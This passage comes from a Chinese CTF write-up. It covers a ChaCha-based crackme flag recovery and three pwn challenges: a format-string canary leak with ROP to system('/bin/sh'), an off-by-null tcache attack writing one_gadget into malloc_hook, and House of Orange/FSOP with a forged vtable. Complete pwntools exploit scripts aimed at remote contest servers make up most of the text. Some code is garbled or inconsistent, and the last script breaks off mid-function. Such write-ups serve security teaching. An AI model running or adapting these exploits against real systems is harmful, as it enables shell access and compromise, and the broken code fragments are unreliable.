        U32TO8_LITTLE(c + 16, x4);
        U32TO8_LITTLE(c + 20, x5);
        U32TO8_LITTLE(c + 24, x6);
        U32TO8_LITTLE(c + 28, x7);
        U32TO8_LITTLE(c + 32, x8);
        U32TO8_LITTLE(c + 36, x9);
        U32TO8_LITTLE(c + 40, x10);
        U32TO8_LITTLE(c + 44, x11);
        U32TO8_LITTLE(c + 48, x12);
        U32TO8_LITTLE(c + 52, x13);
        U32TO8_LITTLE(c + 56, x14);
        U32TO8_LITTLE(c + 60, x15);
        if (bytes input[12] = j12;
          x->input[13] = j13;
          return;
        }
        bytes -= 64;
        c += 64;
        if (m != NULL) {
          m += 64;
        }
      }
    }
    int main(void)
    {
        struct chacha_ctx ctx;
        uint8_t iv[8] = {0,};
        unsigned int i = 0;
        uint8_t result[36]= {0x2e,0xde,0x94,0xc2,0x41,0x8f,0xe3,0xfa,0xfb,0x10,0x4f,0x96,0x64,0xbf,0x2d,0xe3,0x96,0xf1,0x6c,0xa1,0x6b,0xb6,0x9a,0x94,0xfb,0x70,0x3f,0x4b,0x4b,0x7e,0x35,0xc7,0x10,0x90,0x57,0xcb};
        unsigned char* flag=(unsigned char*)malloc(0x40);
        memcpy(flag,result,36);
        const uint8_t key[32]={ 0x99, 0x17, 0x09, 0x3F, 0xB7, 0xFB, 0xD9, 0x7A, 0x79, 0x96, 0x90, 0xA6, 0xB4, 0xCF, 0xE1, 0xAF, 
        0x52, 0x4A, 0x38, 0x9B, 0xF0, 0xCC, 0x59, 0x9C, 0xC9, 0x73, 0xF5, 0x34, 0xB1, 0x7D, 0xDE,0x96};
        chacha_ivsetup(&ctx, iv, NULL);
        chacha_keysetup(&ctx, key,256);
        chacha_encrypt_bytes(&ctx, flag, flag, 36);
        printf("%s",flag);
    }
**crackme参考链接**
[https://blog.csdn.net/A622828/article/details/106414664?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.highlightwordscore&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.highlightwordscore](https://blog.csdn.net/A622828/article/details/106414664?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.highlightwordscore&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.highlightwordscore)
# PWN
## stack
**思路**
一道格式化字符串漏洞，查看保护可以发现 开启了PIE和 canary
通过ida可以发现后门函数 及其所需的参数。
观察程序，可以发现能够利用格式化字符串漏洞泄露地址信息和canary从而绕过其防护
再次利用格式化字符串漏洞覆盖canary和ret ，使其可以执行system("/bin/sh")
**Exp**
    #! /usr/bin/python3
    from pwn import*
    #io = remote("101.35.18.209",20113)
    io = remote("47.108.195.119",20113)
    #io = process('./ezstack')
    context.log_level = 'debug'
    #--------------------------------    io.recvuntil("名称:")
    io.sendline("")
    io.recvuntil("名字:")
    io.sendline("")
    #--------------------------------    
    sh = 0xB24
    system = 0xA7C
    pop_rdi = 0x000b03
    ret = 0x00000000000007c1
    #gdb.attach(io)
    io.sendline(b'%12$p%11$p')
    stack = io.recv(14)
    stack = int(stack,16)
    stack = stack & 0xfffffffffffff000
    print("stack---->"+hex(stack))
    canary = io.recvuntil('\n')[-17:]
    canary = int(canary,16)
    #gdb.attach(io)
    print("canary--->"+hex(canary))
    sh = stack + 0xB24
    system = stack + 0xA8C
    pop_rdi = stack + 0x000b03
    ret = stack + 0x00007c1
    print("sh",hex(sh))
    print("system",hex(system))
    print("pop_rdi",hex(pop_rdi))
    print("ret",hex(ret))
    io.recvuntil("--+--")
    #gdb.attach(io)
    io.sendline(b'a'*0x18 + p64(canary) + p64(0) + p64(pop_rdi) + p64(sh) + p64(system))
    io.interactive()
## noleak
通过观察可以发现有一个栅栏加密。并且存在offbynull漏洞
1.通过栅栏加密利用char为1byte，unsigned int为4byte的特性，加了个一个简单的栅栏加密字符串，解密只需将unsigned
int类型的enc密文先转为单字节的char类型，然后进行栅栏为4的栅栏解密。
2.利用溢出漏洞修改size，将其free后再次malloc可以通过show泄露其地址。
3.利用tcache的特点，可以通过tcache_attack进行攻击，向malloc_hook中写入one_gadget.
4.再次调用malloc即可getshell
解密算法
    #--------------------------------------    ​   a=[0x5f5f794e,0x63745f30,0x7448315f,0x37656e70]
    ​   b=[]
    ​   for i in range(4):
    ​       tmp=a[i]
    ​       for j in range(4):
    ​           b.append(chr(tmp&0xff))
    ​           tmp=tmp>>8
    ​   flag=''
    ​   for i in range(4):
    ​       for j in range(4):
    ​           flag+=b[i+4*j]
    ​   print(flag)
    ​   #N0_py_1n_tHe_ct7
    #---------------------------------------    
**Exp**
    #! /usr/bin/python3
    from pwn import *
    from LibcSearcher import *
    #sh=remote("47.108.195.119",20182)
    sh=remote("101.35.18.209",20112)
    context.log_level = 'debug'
    libc=ELF('./libc.so.6')
    elf = ELF('./noleak')
    #sh=process('./noleak')
    r   =  lambda x : io.recv(x)
    ra  =  lambda   : io.recvall()
    rl  =  lambda   : io.recvline(keepends = True)
    ru  =  lambda x : io.recvuntil(x, drop = True)
    s   =  lambda x : io.send(x)
    sl  =  lambda x : io.sendline(x)
    sa  =  lambda x, y : io.sendafter(x, y)
    sla =  lambda x, y : io.sendlineafter(x, y)
    ia  =  lambda : io.interactive()
    c   =  lambda : io.close()
    li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
    context.log_level='debug'
    def choice(elect):
        sh.recvuntil('4) delete a chunk\n')
        sh.sendline(str(elect))
    def add(index,size):
        choice(1)
        sh.recvuntil('?')
        sh.sendline(str(index))
        sh.recvuntil('?')
        sh.sendline(str(size))
    def edit(index,content,full=False):
        choice(3)
        sh.recvuntil('?')
        sh.sendline(str(index))
        sh.recvuntil(':')
        if full:
            sh.send(content)
        else:
            sh.sendline(content)
    def show(index):
        choice(2)
        sh.recvuntil('?')
        sh.sendline(str(index))
    def delete(index):
        choice(4)
        sh.recvuntil('?')
        sh.sendline(str(index))
    def exploit():
        li('exploit...')
        #--------------------------------    #   sh.recvuntil("名称:")
    #   sh.sendline("")
    #   sh.recvuntil("名字:")
    #   sh.sendline("")
        #--------------------------------    
        sh.sendlineafter("start !\n","N0_py_1n_tHe_ct7")
        add(0,0x80) #A
        add(1,0x18) #B
        add(2,0xf0) #C
        for i in range(7):
            add(i+3,0x80)
        for i in range(7):
            delete(i+3)
            add(i+3,0xf0)
        for i in range(7):
            delete(i+3)
        delete(0)
        #gdb.attach(sh)
        edit(1,b'\x00'*0x10+p64(0xb0),full=True)
        delete(2)
        #gdb.attach(sh)
        for i in range(8):
            add(3,0x80)
        show(1)
        sh.recvuntil('\n',drop=True)
        libc_base=u64(sh.recvuntil('\n',drop=True).replace(b'\n',b'').ljust(8,b'\x00')) - 0x70 - libc.sym['__malloc_hook']
        malloc_hook=libc_base+libc.symbols['__malloc_hook']
        realloc=libc_base+libc.symbols['realloc']
        gadget=[0x41602,0x41656,0xdeec2]
        onegadget=libc_base+gadget[2]
        print(libc_base)
        print(malloc_hook)
        print(onegadget)
        #gdb.attach(sh)
        add(2,0x10)
        delete(2)
        edit(1,p64(malloc_hook-0x8) )
        add(3,0x10)
        add(4,0x18)
        edit(4,p64(onegadget)+p64(onegadget))
        #gdb.attach(sh)
        add(1,0x10)
        sh.interactive()
    if __name__ == '__main__':
        exploit()
        finish()
## ezheap
观察代码 可以发现没有 可以free堆块的函数 ，
于是考虑可以使用houseOforange可以利用堆溢出修改下一chunk的size,从而是堆块分配值unsortbin，然后利用uaf漏洞进行泄露
完成泄露后可以使用FSOP，通过伪造的 vtable 和_IO_FILE_plus,从而通过报错来劫持程序流
1.首先通过gift函数接收地址。在通过溢出修改size，从而使得topchunk的size为0xf81 。 这里需要自行调试使得该chunk对齐
2.再次malloc一个大堆块，使得topchunk进入unsortbin,再次切割该堆块，通过show函数泄露地址。
3.伪造vtable 和_IO_FILE_plus
    fake_file = b'/bin/sh\x00'+p64(0x61)
    fake_file += p64(0)+p64(io_list_all-0x10)
    fake_file += p64(0) + p64(1)
    fake_file = fake_file.ljust(0xc0,b'\x00')
    fake_file += p64(0) * 3
    fake_file += p64(heap+0x1198) #vtable ptr
    fake_file += p64(0) * 2
    fake_file += p64(system)
    payload += fake_file
进入报错函数后将会进入system并以/bin/sh为参数，这注意#vtable ptr需要自行调试使其指向自身。
4.再次执行malloc即可getshell
**Exp**
    #!/usr/bin/env python3
    #-*- coding:utf-8 -*-    from pwn import *
    import os
    r   =  lambda x : io.recv(x)
    ra  =  lambda   : io.recvall()
    rl  =  lambda   : io.recvline(keepends = True)
    ru  =  lambda x : io.recvuntil(x, drop = True)
    s   =  lambda x : io.send(x)
    sl  =  lambda x : io.sendline(x)
    sa  =  lambda x, y : io.sendafter(x, y)
    sla =  lambda x, y : io.sendlineafter(x, y)
    ia  =  lambda : io.interactive()
    c   =  lambda : io.close()
    li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
    context.log_level='debug'
    #elf = ELF('./EZheap')
    elf = ELF('./pwn')
    libc = ELF("./libc.so.6")
    #io = elf.process()
    io = remote("47.108.195.119",  20141)
    def ad(sz,na):
        sla('away\n', '1')
        sla('size of it', str(sz))
        sla('Name?', na)
    def md(sz, na):
        sla('away\n', '2')